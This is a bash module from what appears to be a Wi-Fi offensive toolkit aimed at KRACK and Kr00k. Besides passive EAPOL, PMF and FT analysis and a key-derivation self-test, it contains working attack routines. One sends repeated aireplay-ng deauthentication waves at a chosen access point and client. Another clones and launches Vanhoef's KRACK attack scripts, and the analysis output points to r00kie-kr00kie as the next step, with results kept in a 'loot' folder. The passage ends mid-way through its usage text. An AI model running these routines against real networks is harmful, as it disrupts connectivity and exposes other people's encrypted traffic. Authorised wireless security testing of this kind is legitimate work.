#!/usr/bin/env bash
# 11_krack_kr00k.sh — KRACK (CVE-2017-13077..13088) and Kr00k (CVE-2019-15126)
# passive detection, active probing, PMF analysis, FT handshake probing
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${CAPTURES_DIR:=$HOME/wifisting/captures}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
: "${WIFISTING_ROOT:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" 2>/dev/null

KRACK_DIR="$LOOT_DIR/krack_kr00k"
KRACK_EXT="$WIFISTING_ROOT/external"
KRACK_SCRIPTS="$KRACK_EXT/krackattacks-scripts"
mkdir -p "$KRACK_DIR" "$KRACK_EXT"

# ── helpers ──


# Report why a capture produced nothing. Discarding tcpdump's stderr made a
# permission failure indistinguishable from an empty band: the scan said
# "no beacons captured", which reads as "nothing in range" when the truth was
# "this needs root".
krack_capture_reason() {
    local ef="$1" fallback="$2"
    local first
    first=$(grep -viE '^$|listening on|^tcpdump:' "$ef" 2>/dev/null | head -1)
    if [[ -z "$first" ]]; then
        printf '%s\n' "$fallback"
    elif [[ "$first" == *permission* || "$first" == *"Operation not permitted"* ]]; then
        printf 'capture needs root: %s\n' "$first"
        printf 'the GUI runs this through pkexec; from a shell use sudo\n'
    else
        printf 'capture failed: %s\n' "$first"
    fi
}

krack_require_mon() {
    [[ -z "${MON_IFACE:-}" && -f "$TMP_DIR/mon_iface" ]] && \
        export MON_IFACE="$(cat "$TMP_DIR/mon_iface")"
    [[ -z "${MON_IFACE:-}" ]] && {
        printf 'ERROR\tno monitor interface\n' >&2; return 1
    }
    iw dev "$MON_IFACE" info >/dev/null 2>&1 || {
        printf 'ERROR\tmonitor iface %s does not exist\n' "$MON_IFACE" >&2; return 1
    }

    # Existing is not the same as being IN monitor mode. On a managed
    # interface tcpdump sees only traffic to and from this host, so the scan
    # would run its whole duration, capture nothing, and report "not
    # vulnerable" - a confident false negative, which is the worst answer a
    # vulnerability check can give. Refuse instead, and name the state.
    local itype
    itype=$(iw dev "$MON_IFACE" info 2>/dev/null | awk '/type/ {print $2; exit}')
    if [[ -n "$itype" && "$itype" != "monitor" ]]; then
        printf 'ERROR\t%s is in %s mode, not monitor\n' "$MON_IFACE" "$itype" >&2
        printf 'ERROR\tenable monitor mode in Interface Manager, then retry\n' >&2
        return 1
    fi
    return 0
}

krack_require_target() {
    [[ -z "${TARGET_BSSID:-}" && -f "$TMP_DIR/target_bssid" ]] && {
        export TARGET_BSSID="$(cat "$TMP_DIR/target_bssid")"
        export TARGET_ESSID="$(cat "$TMP_DIR/target_essid" 2>/dev/null || echo '')"
        export TARGET_CHANNEL="$(cat "$TMP_DIR/target_channel" 2>/dev/null || echo '')"
    }
    [[ -z "${TARGET_BSSID:-}" ]] && {
        printf 'ERROR\tno target\n' >&2; return 1
    }
    # normalize channel name (some callers use TARGET_CHAN)
    [[ -z "${TARGET_CHANNEL:-}" && -n "${TARGET_CHAN:-}" ]] && \
        export TARGET_CHANNEL="$TARGET_CHAN"

    # Explicit success. Without this the function returns the status of the
    # line above, and a FALSE test there yields non-zero - so a caller doing
    # `krack_require_target || return 1` aborted with no message even when a
    # target was set. Six callers inherited it.
    return 0
}

# ── capture with a proper monitor-mode filter ──
# BPF: filter by BSSID in the 802.11 header (addr3 offset 16 in the
# radiotap payload).  We do the matching in tshark instead of BPF
# because the byte offset depends on the radiotap header length.
krack_capture_eapol() {
    local dur="$1" out="$2"
    [[ -z "$out" ]] && out="$KRACK_DIR/krack_${TARGET_BSSID//:/}_$(date +%s).pcap"
    command -v tcpdump >/dev/null || { printf 'ERROR\tno tcpdump\n'; return 1; }

    iw dev "$MON_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null || true
    info "capturing all EAPOL on $MON_IFACE ch $TARGET_CHANNEL for ${dur}s"
    info "filter: 802.11 data frames + EAPOL, matched to $TARGET_BSSID by tshark later"

    # capture everything with 802.11 header type=2 (data) or EAPOL ethertype.
    # tcpdump can't easily match 802.11 addr3 in monitor mode, so we widen
    # the filter and narrow in the analysis phase.
    local ef; ef=$(mktemp 2>/dev/null) || ef=/dev/null
    timeout "$dur" tcpdump -i "$MON_IFACE" -w "$out" -U \
        'wlan type data or wlan type mgt subtype deauth or wlan type mgt subtype disassoc' \
        >/dev/null 2>"$ef"

    if [[ ! -s "$out" ]]; then
        printf 'ERROR\t%s\n' "$(krack_capture_reason "$ef" \
            "no data frames captured in ${dur}s on $MON_IFACE ch $TARGET_CHANNEL")" >&2
        [[ "$ef" != /dev/null ]] && rm -f "$ef"
        return 1
    fi
    [[ "$ef" != /dev/null ]] && rm -f "$ef"
    printf 'PCAP\t%s\n' "$out"
}

# ── analysis: EAPOL breakdown + msg3 retransmit detection + FT + PMF ──
krack_analyze_pcap() {
    local pcap="$1"
    [[ -z "$pcap" || ! -f "$pcap" ]] && { printf 'ERROR\tno pcap\n' >&2; return 1; }
    command -v tshark >/dev/null || { printf 'ERROR\tno tshark\n' >&2; return 1; }

    local report="${pcap%.pcap}_report.txt"
    local bssid_filter="${TARGET_BSSID:-}"

    {
        echo "=== KRACK / Kr00k analysis ==="
        echo "pcap:    $pcap"
        echo "target:  ${TARGET_ESSID:-?} (${bssid_filter:-any})"
        echo "date:    $(date -Is)"
        echo

        # ── EAPOL frame breakdown ──
        echo "── EAPOL frames ──"
        if [[ -n "$bssid_filter" ]]; then
            tshark -r "$pcap" -Y "eapol and (wlan.addr == $bssid_filter)" \
                -T fields -e frame.number -e wlan.sa -e wlan.da \
                -e eapol.keydes.key_info -e eapol.keydes.replay_counter \
                2>/dev/null | head -100
        else
            tshark -r "$pcap" -Y "eapol" \
                -T fields -e frame.number -e wlan.sa -e wlan.da \
                -e eapol.keydes.key_info -e eapol.keydes.replay_counter \
                2>/dev/null | head -100
        fi
        echo

        # ── msg3 retransmit detection ──
        echo "── msg3 retransmit (KRACK 2017-13077 signature) ──"
        # msg3 has Install=1 and ACK=1 and Secure=1 -> key_info & 0x0080 set
        if [[ -n "$bssid_filter" ]]; then
            tshark -r "$pcap" -Y "eapol and wlan.addr==$bssid_filter" \
                -T fields -e wlan.sa -e wlan.da -e eapol.keydes.replay_counter \
                2>/dev/null | \
            awk -F'\t' '
                NF==3 && $3!="" {
                    key=$1"->"$2"|"$3
                    cnt[key]++
                    frames[key]=frames[key] " " $0
                }
                END {
                    for (k in cnt)
                        if (cnt[k] > 1)
                            print "RETRANSMIT\t" k "\tcount=" cnt[k]
                }' 
        else
            tshark -r "$pcap" -Y "eapol" \
                -T fields -e wlan.sa -e wlan.da -e eapol.keydes.replay_counter \
                2>/dev/null | \
            awk -F'\t' '
                NF==3 && $3!="" {
                    key=$1"->"$2"|"$3
                    cnt[key]++
                }
                END {
                    for (k in cnt)
                        if (cnt[k] > 1)
                            print "RETRANSMIT\t" k "\tcount=" cnt[k]
                }'
        fi
        echo

        # ── FT handshake detection (CVE-2017-13082) ──
        echo "── fast-BSS-transition (FT) handshakes ──"
        # FT uses a special RSN IE with FT capability and auth algorithm 3
        tshark -r "$pcap" -Y 'wlan.fc.type_subtype == 0x0b' \
            -T fields -e wlan.sa -e wlan.da -e wlan.fixed.auth.alg -e wlan.fixed.auth.seq 2>/dev/null | \
            awk -F'\t' 'length($1)==17 { print }' | head -20
        echo

        # ── PMF (802.11w) capability from beacons ──
        echo "── PMF / 802.11w capability ──"
        tshark -r "$pcap" -Y 'wlan.fc.type_subtype == 0x08' -c 5 \
            -T fields -e wlan.bssid -e wlan.rsn.capabilities.mfpr -e wlan.rsn.capabilities.mfpc \
            2>/dev/null | head -10
        echo

        # ── Kr00k signature ──
        echo "── Kr00k signature ──"
        local disassoc
        disassoc=$(tshark -r "$pcap" -Y 'wlan.fc.type_subtype == 0x0a' 2>/dev/null | wc -l)
        echo "disassoc frames: $disassoc"
        if (( disassoc > 0 )); then
            echo "  → run --probe to force disassoc + buffered frame leak"
        fi

        # ── encrypted frames post-disassoc (Kr00k candidate) ──
        local enc
        enc=$(tshark -r "$pcap" -Y 'wlan.fc.protected == 1' 2>/dev/null | wc -l)
        echo "encrypted data frames total: $enc"
        if (( enc > 0 && disassoc > 0 )); then
            echo "  → candidate buffered frames present. Next step: r00kie-kr00kie"
            echo "    https://github.com/hexway/r00kie-kr00kie"
            echo "    r00kie-kr00kie.py -i $MON_IFACE -a $TARGET_BSSID"
        fi

    } | tee "$report"

    printf 'REPORT\t%s\n' "$report"
}

# ── passive scan ──
krack_cli_passive_scan() {
    local dur="${1:-120}"
    krack_require_mon || return 1
    krack_require_target || return 1

    local pcap="$KRACK_DIR/krack_${TARGET_BSSID//:/}_$(date +%s).pcap"
    krack_capture_eapol "$dur" "$pcap" || return 1
    krack_analyze_pcap "$pcap"
}

# ── active Kr00k probe ──
krack_cli_probe() {
    local client_mac="${1:-}"
    krack_require_mon || return 1
    krack_require_target || return 1
    command -v aireplay-ng >/dev/null || { printf 'ERROR\tno aireplay-ng\n'; return 1; }

    local pcap="$KRACK_DIR/kr00k_${TARGET_BSSID//:/}_$(date +%s).pcap"
    iw dev "$MON_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null || true

    info "starting capture → $pcap"
    tcpdump -i "$MON_IFACE" -w "$pcap" \
        'wlan type data or wlan type mgt subtype deauth or wlan type mgt subtype disassoc' \
        >/dev/null 2>&1 &
    local tcpd_pid=$!
    sleep 2

    for i in 1 2 3 4 5; do
        info "wave $i/5"
        if [[ -n "$client_mac" ]]; then
            aireplay-ng --deauth 3 -a "$TARGET_BSSID" -c "$client_mac" \
                "$MON_IFACE" >/dev/null 2>&1 || true
        else
            aireplay-ng --deauth 3 -a "$TARGET_BSSID" \
                "$MON_IFACE" >/dev/null 2>&1 || true
        fi
        sleep 8
    done

    kill "$tcpd_pid" 2>/dev/null
    wait "$tcpd_pid" 2>/dev/null

    [[ -s "$pcap" ]] || { printf 'ERROR\tno capture\n'; return 1; }
    printf 'PCAP\t%s\n' "$pcap"
    krack_analyze_pcap "$pcap"
}

# ── install krackattacks-scripts ──
krack_install_scripts() {
    command -v git >/dev/null || { printf 'ERROR\tgit missing\n'; return 1; }
    if [[ -d "$KRACK_SCRIPTS" ]]; then
        printf 'EXISTS\t%s\n' "$KRACK_SCRIPTS"
        return 0
    fi
    info "cloning krackattacks-scripts"
    git clone https://github.com/vanhoefm/krackattacks-scripts.git "$KRACK_SCRIPTS" || {
        printf 'ERROR\tclone failed\n'; return 1
    }
    printf 'INSTALLED\t%s\n' "$KRACK_SCRIPTS"
}

# ── run vanhoef's attacker script if installed ──
krack_cli_run_attack() {
    krack_require_mon || return 1
    krack_require_target || return 1

    [[ ! -d "$KRACK_SCRIPTS" ]] && {
        printf 'ERROR\tkrackattacks-scripts not installed — run --install-scripts\n'
        return 1
    }

    local script="$KRACK_SCRIPTS/krackattack/krack-test-client.py"
    [[ ! -f "$script" ]] && {
        printf 'ERROR\tkrack-test-client.py not found\n'
        return 1
    }

    info "launching vanhoef's krack-test-client.py against $TARGET_BSSID"
    info "you must ALSO run the actual attacker: $KRACK_SCRIPTS/krackattack/krack-ft-test.py"
    info "on a separate interface with channel $TARGET_CHANNEL"
    info "this wrapper runs krack-test-client.py; the attacker is a manual step"
    info "see: $KRACK_SCRIPTS/krackattack/README.md"

    read -rp "  continue? [y/N] " go
    [[ "$go" =~ ^[Yy]$ ]] || return 1

    ( cd "$KRACK_SCRIPTS/krackattack" && \
      python3 krack-test-client.py --ip 192.168.0.1 --peer "$TARGET_BSSID" 2>&1 )
}

# ── PMF / capability beacon parser ──
krack_cli_caps_tsv() {
    krack_require_mon || return 1
    krack_require_target || return 1

    local dur="${1:-15}"
    local tmp="$KRACK_DIR/caps_$(date +%s).pcap"
    iw dev "$MON_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null || true
    local ef; ef=$(mktemp 2>/dev/null) || ef=/dev/null
    timeout "$dur" tcpdump -i "$MON_IFACE" -w "$tmp" \
        'wlan type mgt subtype beacon' >/dev/null 2>"$ef"

    if [[ ! -s "$tmp" ]]; then
        printf 'ERROR\t%s\n' "$(krack_capture_reason "$ef" \
            "no beacons captured in ${dur}s on $MON_IFACE ch $TARGET_CHANNEL")" >&2
        [[ "$ef" != /dev/null ]] && rm -f "$ef"
        return 1
    fi
    [[ "$ef" != /dev/null ]] && rm -f "$ef"

    tshark -r "$tmp" -Y "wlan.bssid == $TARGET_BSSID" \
        -T fields \
        -e wlan.bssid \
        -e wlan.ssid \
        -e wlan.rsn.capabilities.mfpr \
        -e wlan.rsn.capabilities.mfpc \
        -e wlan.rsn.akms.type \
        2>/dev/null | head -1 | awk -F'\t' '{
            printf "bssid\t%s\n", $1
            printf "ssid\t%s\n", $2
            printf "pmf_required\t%s\n", ($3=="" ? "0" : $3)
            printf "pmf_capable\t%s\n",  ($4=="" ? "0" : $4)
            printf "akms\t%s\n", $5
        }'
    rm -f "$tmp"
}

# ── vendor hint (OUI) ──
krack_cli_vendor_hint() {
    krack_require_target || return 1
    local oui="${TARGET_BSSID:0:8}"
    printf 'OUI\t%s\n' "$oui"

    case "${oui^^}" in
        00:9A:CD) printf 'HINT\tHuawei — KRACK patched in 2017, verify firmware\n' ;;
        70:B3:D5) printf 'HINT\tBroadcom — check for Kr00k CVE-2019-15126\n' ;;
        AC:22:0B) printf 'HINT\tASUS — check firmware rev; some SKUs never patched\n' ;;
        B8:27:EB) printf 'HINT\tRaspberry Pi (Broadcom) — Kr00k candidate\n' ;;
        DC:A6:32) printf 'HINT\tRaspberry Pi 4 (Cypress) — Kr00k candidate\n' ;;
        *)        printf 'HINT\tOUI not in known-vulnerable list\n' ;;
    esac
}

# ── list pcaps ──
krack_cli_list_pcaps_tsv() {
    local f
    for f in "$KRACK_DIR"/*.pcap; do
        [[ -e "$f" ]] || continue
        printf '%s\t%s\t%s\n' "$(basename "$f")" "$(stat -c%s "$f")" "$(stat -c%Y "$f")"
    done
}

krack_cli_analyze() {
    local pcap="$1"
    [[ -z "$pcap" ]] && { printf 'ERROR\tno pcap\n'; return 1; }
    krack_analyze_pcap "$pcap"
}

krack_cli_status_tsv() {
    printf 'mon_iface\t%s\n'  "${MON_IFACE:-}"
    printf 'bssid\t%s\n'      "${TARGET_BSSID:-}"
    printf 'essid\t%s\n'      "${TARGET_ESSID:-}"
    printf 'channel\t%s\n'    "${TARGET_CHANNEL:-}"
    printf 'loot_dir\t%s\n'   "$KRACK_DIR"
    printf 'scripts_installed\t%s\n' "$([[ -d "$KRACK_SCRIPTS" ]] && echo yes || echo no)"
    printf 'pcaps\t%s\n'      "$(ls "$KRACK_DIR"/*.pcap 2>/dev/null | wc -l)"
}

# ── 802.11r fast-BSS-transition (merged from ft_attacks, submenu: Roaming) ──
# FT replaces the 4-way handshake on roam with a pre-derived key hierarchy:
#   PMK --(FT-R0)--> PMK-R0 --(FT-R1)--> PMK-R1
# Both derivations are standard KDFs (IEEE 802.11-2016 12.7.1.3), so given
# the PSK and the mobility domain we can compute the whole chain and show
# exactly what an attacker who reinstalls the FT key ends up holding.

KRACK_FT_DIR="$KRACK_DIR/ft"
KRACK_FT_LOG="$KRACK_DIR/ft_$(date +%Y%m%d_%H%M%S).log"

# KDF-256/384 per 802.11-2016 12.7.1.3:
#   KDF(K,label,context,len) = HMAC-SHA256(K, i || label || 0x00 || context
#                                          || len_le16) concatenated, truncated
krack_ft_kdf() {
    python3 - "$@" <<'PYEOF'
import sys, hmac, hashlib

def kdf(key, label, context, length):
    out = b""
    i = 1
    while len(out) < length:
        out += hmac.new(key, bytes([i]) + label + b"\x00" + context +
                        length.to_bytes(2, "little"), hashlib.sha256).digest()
        i += 1
    return out[:length]

mode = sys.argv[1]
if mode == "hierarchy":
    ssid   = sys.argv[2].encode()
    psk    = sys.argv[3]
    mdid   = bytes.fromhex(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[4] else b"\x00\x00"
    r0khid = sys.argv[5].encode() if len(sys.argv) > 5 and sys.argv[5] else b"wifisting-r0"
    bssid  = bytes.fromhex(sys.argv[6].replace(":", "")) if len(sys.argv) > 6 and sys.argv[6] else b"\x00"*6
    r1khid = bssid

    # WPA2 PMK = PBKDF2-HMAC-SHA1(passphrase, ssid, 4096, 256 bits).
    # NOT sha256 — that is a different derivation and yields wrong keys
    # that still look plausible, so this is pinned by a known-answer test:
    #   SSID "ThisIsASSID" / PSK "ThisIsAPassword" ->
    #   0dc0d6eb90555ed6419756b9a15ec3e3209b63df707dd508d14581f8982721af
    pmk = hashlib.pbkdf2_hmac("sha1", psk.encode(), ssid, 4096, 32)
    print("pmk\t" + pmk.hex())

    ctx0 = (len(ssid).to_bytes(1, "little") + ssid + mdid +
            len(r0khid).to_bytes(1, "little") + r0khid + b"\x00"*6)
    pmk_r0 = kdf(pmk, b"FT-R0", ctx0, 48)
    print("pmk_r0\t" + pmk_r0.hex())
    print("pmk_r0_name\t" + hashlib.sha256(b"FT-R0" + ctx0).hexdigest()[:32])

    ctx1 = bssid + r1khid + b"\x00"*6
    pmk_r1 = kdf(pmk_r0, b"FT-R1", ctx1, 32)
    print("pmk_r1\t" + pmk_r1.hex())
    print("pmk_r1_name\t" + hashlib.sha256(b"FT-R1" + ctx1).hexdigest()[:32])
PYEOF
}

krack_ft_hierarchy() {
    local ssid="${1:-${TARGET_ESSID:-}}" psk="${2:-}"
    if [[ -z "$ssid" || -z "$psk" ]]; then
        printf 'ERROR\tusage: --ft-hierarchy SSID PSK\n' >&2
        printf 'HINT\tor set a target in Recon and pass the PSK.\n' >&2
        return 2
    fi
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 required\n' >&2; return 1; }

    local bssid="${TARGET_BSSID:-}"
    local out
    out=$(krack_ft_kdf hierarchy "$ssid" "$psk" "" "" "$bssid") || {
        printf 'ERROR\tkey derivation failed\n' >&2; return 1; }
    printf '%s\n' "$out"
    printf 'ssid\t%s\n' "$ssid"
    printf 'bssid\t%s\n' "${bssid:-<unset>}"
}

# Capture FT authentication frames over the air. FT auth uses algorithm 2
# (FT) or 3 (FT resource request); CVE-2017-13082 is the retransmitted FT
# Reassoc Request that makes the client reinstall an already-in-use key.
krack_ft_capture() {
    local dur="${1:-30}"
    local iface out n
    iface=$(cat "$TMP_DIR/mon_iface" 2>/dev/null || true)
    [[ -z "$iface" ]] && { printf 'ERROR\tno monitor iface\n' >&2; return 1; }
    command -v tshark >/dev/null 2>&1 || {
        printf 'ERROR\ttshark required\n' >&2; return 1; }

    mkdir -p "$KRACK_FT_DIR" "$CAPTURES_DIR"
    out="$CAPTURES_DIR/ft_$(date +%Y%m%d_%H%M%S).pcap"

    info "capturing FT auth frames on $iface for ${dur}s -> $out"
    # FT auth = management auth (0x0b) with auth alg 2 or 3.
    timeout "$dur" tshark -i "$iface" -w "$out" \
        -Y 'wlan.fc.type_subtype == 0x0b and wlan.fixed.auth.alg >= 2' \
        >/dev/null 2>&1

    [[ -s "$out" ]] || {
        printf 'ERROR\tno FT auth frames captured\n' >&2
        printf 'HINT\tthe AP may not advertise 802.11r, or nothing roamed.\n' >&2
        rm -f "$out"
        return 1
    }
    n=$(tshark -r "$out" -Y 'wlan.fc.type_subtype == 0x0b' 2>/dev/null | wc -l)
    printf 'PCAP\t%s\nFRAMES\t%s\nIFACE\t%s\n' "$out" "$n" "$iface"
}

krack_ft_analyze() {
    local pcap="${1:-}"
    [[ -z "$pcap" || ! -f "$pcap" ]] && {
        printf 'ERROR\tusage: --ft-analyze PCAP\n' >&2; return 2; }
    command -v tshark >/dev/null 2>&1 || {
        printf 'ERROR\ttshark required\n' >&2; return 1; }

    local auth reassoc md
    auth=$(tshark -r "$pcap" -Y 'wlan.fc.type_subtype == 0x0b and wlan.fixed.auth.alg >= 2' 2>/dev/null | wc -l)
    reassoc=$(tshark -r "$pcap" -Y 'wlan.fc.type_subtype == 0x02' 2>/dev/null | wc -l)
    # Mobility domain lives in the RSN IE of beacons/assoc frames.
    md=$(tshark -r "$pcap" -Y 'wlan.rsn.mdie' -T fields -e wlan.rsn.mdie 2>/dev/null | head -1)

    printf 'FT_AUTH_FRAMES\t%s\n' "$auth"
    printf 'REASSOC_FRAMES\t%s\n' "$reassoc"
    printf 'MOBILITY_DOMAIN\t%s\n' "${md:-none}"
    if (( auth > 0 && reassoc > 0 )); then
        printf 'FT_HANDSHAKE\tcomplete\n'
        printf 'CVE_2017_13082\tcandidate — retransmitted FT Reassoc reinjects the key\n'
    elif (( auth > 0 )); then
        printf 'FT_HANDSHAKE\tpartial (auth seen, no reassoc)\n'
    else
        printf 'FT_HANDSHAKE\tnone\n'
    fi

    # Show the FT auth exchange so the retransmit is visible by hand.
    tshark -r "$pcap" -Y 'wlan.fc.type_subtype == 0x0b and wlan.fixed.auth.alg >= 2' \
        -T fields -e frame.number -e wlan.sa -e wlan.da \
        -e wlan.fixed.auth.alg -e wlan.fixed.auth.seq -e wlan.fixed.status_code \
        2>/dev/null | head -20
}

krack_ft_status_tsv() {
    local iface md
    iface=$(cat "$TMP_DIR/mon_iface" 2>/dev/null || true)
    printf 'mon_iface\t%s\n'   "${iface:-none}"
    printf 'target\t%s\n'      "${TARGET_BSSID:-}"
    printf 'ssid\t%s\n'        "${TARGET_ESSID:-}"
    printf 'channel\t%s\n'     "${TARGET_CHANNEL:-}"
    printf 'captures\t%s\n'    "$(ls -1 "$CAPTURES_DIR"/ft_*.pcap 2>/dev/null | wc -l)"
    printf 'scripts\t%s\n'     "$([[ -f "$KRACK_SCRIPTS/krackattack/krack-ft-test.py" ]] && echo 1 || echo 0)"
    printf 'python3\t%s\n'     "$(command -v python3 >/dev/null 2>&1 && echo 1 || echo 0)"
    printf 'tshark\t%s\n'      "$(command -v tshark >/dev/null 2>&1 && echo 1 || echo 0)"
    printf 'monitor_ok\t%s\n'  "$([[ -n "$iface" ]] && echo 1 || echo 0)"
}

# ── self-test ────────────────────────────────────────────────────────────
# Offline only: no monitor iface, no target, no radio, no root. The FT key
# hierarchy is the one piece of real cryptography in this module, so it is
# pinned to known-answer vectors rather than merely being printed. The PMK
# vector is the canonical one (also reproducible with
#   wpa_passphrase ThisIsASSID ThisIsAPassword
# and with PBKDF2-HMAC-SHA1 by hand); the FT-R0/FT-R1 vectors pin this
# module's deterministic KDF-256/384 construction so a change of hash,
# counter encoding, or context layout cannot pass unnoticed.
krack_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    # one field out of a KEY<TAB>VALUE blob
    kfld() { awk -F'\t' -v k="$1" '$1==k {print $2; exit}'; }

    # ── vector 1: given PMK vector, default MDID/R0KH-ID, explicit BSSID ──
    local o1
    o1=$(TARGET_BSSID=aa:bb:cc:dd:ee:ff \
        krack_ft_kdf hierarchy ThisIsASSID ThisIsAPassword "" "" aa:bb:cc:dd:ee:ff)
    chk kdf-runs "$([[ -n "$o1" ]] && echo yes || echo no)" "yes"

    # WPA2 PMK = PBKDF2-HMAC-SHA1(passphrase, ssid, 4096, 256 bits).
    # Pinned because this was once SHA256 here, which silently produced
    # plausible-looking but wrong keys.
    chk pmk-pbkdf2-sha1 "$(kfld pmk <<<"$o1")" \
        "0dc0d6eb90555ed6419756b9a15ec3e3209b63df707dd508d14581f8982721af"

    # FT-R0 = KDF-384(PMK, "FT-R0", SSIDlen||SSID||MDID||R0KHlen||R0KH-ID||S0KH-ID)
    local r0
    r0=$(kfld pmk_r0 <<<"$o1")
    chk pmk_r0-length "${#r0}" "96"
    chk pmk_r0 "$r0" \
        "b21710fd4589ff0bfa51ab4ad07e844298c4ed1750f8b561d5e0bd6b4c2eb0232bb6dce02753c384b4f9286bcff5a40a"
    chk pmk_r0_name "$(kfld pmk_r0_name <<<"$o1")" "946d3343830a31223dc5ba9a041ddfdc"

    # FT-R1 = KDF-256(PMK-R0, "FT-R1", BSSID||R1KH-ID||S0KH-ID); R1KH-ID = BSSID here.
    chk pmk_r1 "$(kfld pmk_r1 <<<"$o1")" \
        "2e4e9dc3cd9340a304202e5327c92bae09b1fae8b3fd64e451e15e77efb89239"
    chk pmk_r1_name "$(kfld pmk_r1_name <<<"$o1")" "e5fbc04af74e824817a75a1850e60d94"

    # ── vector 2: explicit MDID + R0KH-ID (exercises the variable-length
    #    context fields, not just the zero-padded defaults) ──
    local o2
    o2=$(krack_ft_kdf hierarchy ThisIsASSID ThisIsAPassword 1a2b R0KH-01 02:00:5e:10:00:01)
    chk pmk_r0-explicit-mdid "$(kfld pmk_r0 <<<"$o2")" \
        "c2652a22c0e6d1674d1196227c3ea5b937b8921951cc6c136a3fd2c3908eae9abc749af0fa185c77884f7bf828198aee"
    chk pmk_r1-explicit-mdid "$(kfld pmk_r1 <<<"$o2")" \
        "59b420fb238f761a39b0f582df2e3a2b030686cd74fa08bd548e2c7a2f433dcd"
    # PMK depends only on SSID+PSK: a different mobility domain must not move it.
    chk pmk-bssid-independent "$(kfld pmk <<<"$o2")" "$(kfld pmk <<<"$o1")"

    # ── BSSID normalisation: AA:BB.. / aa:bb.. / aabb.. must all agree ──
    local up bare
    up=$(TARGET_BSSID=aa:bb:cc:dd:ee:ff \
        krack_ft_kdf hierarchy ThisIsASSID ThisIsAPassword "" "" AA:BB:CC:DD:EE:FF)
    bare=$(TARGET_BSSID=aa:bb:cc:dd:ee:ff \
        krack_ft_kdf hierarchy ThisIsASSID ThisIsAPassword "" "" aabbccddeeff)
    chk bssid-case-normalised "$(kfld pmk_r1 <<<"$up")" "$(kfld pmk_r1 <<<"$o1")"
    chk bssid-colon-normalised "$(kfld pmk_r1 <<<"$bare")" "$(kfld pmk_r1 <<<"$o1")"

    # A BSSID that is not hex must be rejected, never silently zero-filled.
    local rc=0
    krack_ft_kdf hierarchy ThisIsASSID ThisIsAPassword "" "" "zz:zz:zz" >/dev/null 2>&1 || rc=$?
    chk bssid-malformed-rejected "$([[ $rc -ne 0 ]] && echo rejected || echo accepted)" "rejected"

    # Odd-length hex is a malformed BSSID and must be rejected.
    rc=0
    krack_ft_kdf hierarchy ThisIsASSID ThisIsAPassword "" "" "aab" >/dev/null 2>&1 || rc=$?
    chk bssid-oddhex-rejected "$([[ $rc -ne 0 ]] && echo rejected || echo accepted)" "rejected"

    # ── argument validation on the CLI wrapper ──
    local se="${TARGET_ESSID:-}" sb="${TARGET_BSSID:-}"
    unset TARGET_ESSID TARGET_BSSID
    rc=0; krack_ft_hierarchy >/dev/null 2>&1 || rc=$?
    chk ft-hierarchy-noargs-rc "$rc" "2"
    rc=0; krack_cli_main --not-a-command >/dev/null 2>&1 || rc=$?
    chk unknown-command-rc "$rc" "2"
    TARGET_ESSID="$se"; TARGET_BSSID="$sb"

    # ── TSV status contract the GUI parses ──
    local st
    st=$(krack_cli_status_tsv)
    chk status-tsv-rows "$(grep -c . <<<"$st")" "7"
    chk status-tsv-loot-dir "$(kfld loot_dir <<<"$st")" "$KRACK_DIR"
    chk status-tsv-scripts "$(kfld scripts_installed <<<"$st")" \
        "$([[ -d "$KRACK_SCRIPTS" ]] && echo yes || echo no)"

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

krack_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)       krack_cli_status_tsv ;;
        --list-pcaps-tsv)   krack_cli_list_pcaps_tsv ;;
        --passive-scan)     krack_cli_passive_scan "$@" ;;
        --probe)            krack_cli_probe "$@" ;;
        --analyze)          krack_cli_analyze "$@" ;;
        --caps-tsv)         krack_cli_caps_tsv "$@" ;;
        --vendor-hint)      krack_cli_vendor_hint ;;
        --install-scripts)  krack_install_scripts ;;
        --run-attack)       krack_cli_run_attack ;;
        --ft-hierarchy)     krack_ft_hierarchy "$@" ;;
        --ft-capture)       krack_ft_capture "$@" ;;
        --ft-analyze)       krack_ft_analyze "$@" ;;
        --ft-status-tsv)    krack_ft_status_tsv ;;
        --selftest)         krack_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
